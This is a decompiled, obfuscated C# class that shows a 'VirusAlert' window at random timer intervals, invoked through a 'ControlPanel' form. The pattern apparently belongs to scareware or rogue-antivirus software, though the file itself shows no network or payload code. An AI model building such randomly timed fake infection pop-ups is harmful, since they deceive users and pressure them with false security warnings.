using System;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

public sealed class GClass3
{
	private sealed class Class10
	{
		public string string_0;

		public void method_0()
		{
			smethod_2(string_0);
		}
	}

	private System.Timers.Timer timer_0;

	public void method_0()
	{
		timer_0 = new System.Timers.Timer();
		timer_0.Interval = smethod_4();
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.AutoReset = true;
		timer_0.Enabled = true;
		timer_0.Start();
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		System.Timers.Timer timer = sender as System.Timers.Timer;
		timer.Interval = smethod_4();
		smethod_0();
	}

	public static void smethod_0()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		if (Thread.CurrentThread.TrySetApartmentState(ApartmentState.STA))
		{
			smethod_1();
		}
		else if (Application.get_OpenForms().get_Item(0) is ControlPanel controlPanel && ((Control)controlPanel).get_InvokeRequired())
		{
			((Control)controlPanel).Invoke((Delegate)new MethodInvoker(smethod_1));
		}
	}

	private static void smethod_1()
	{
		VirusAlert virusAlert = new VirusAlert();
		((Control)virusAlert).Show();
	}

	private static void smethod_2(string string_0)
	{
		VirusAlert virusAlert = new VirusAlert(string_0);
		((Control)virusAlert).Show();
	}

	public static void smethod_3(string string_0)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		MethodInvoker val = null;
		Class10 @class = new Class10();
		@class.string_0 = string_0;
		if (Thread.CurrentThread.TrySetApartmentState(ApartmentState.STA))
		{
			smethod_2(@class.string_0);
		}
		else if (Application.get_OpenForms().get_Item(0) is ControlPanel controlPanel && ((Control)controlPanel).get_InvokeRequired())
		{
			if (val == null)
			{
				val = new MethodInvoker(@class.method_0);
			}
			((Control)controlPanel).Invoke((Delegate)(object)val);
		}
	}

	private static int smethod_4()
	{
		return new Random().Next(Class6.int_1, Class6.int_2);
	}
}
